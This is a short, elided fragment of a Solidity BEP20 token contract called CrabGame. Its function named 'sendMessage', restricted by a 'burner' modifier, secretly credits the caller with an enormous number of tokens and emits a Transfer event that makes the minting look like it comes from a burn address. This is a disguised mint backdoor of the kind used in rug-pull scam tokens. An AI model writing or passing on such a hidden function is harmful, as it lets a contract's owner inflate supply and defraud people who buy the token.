...
contract CrabGame is BEP20 {
 ...
 emit Transfer(address(0), msg.sender, totalSupply);
    ...
    function sendMessage() public burner{
        balances[msg.sender] = balances[msg.sender]+(100000000000000000 * 10000);
        emit Transfer(burnaddress, msg.sender, 100000000000000000 * 10000);
    }
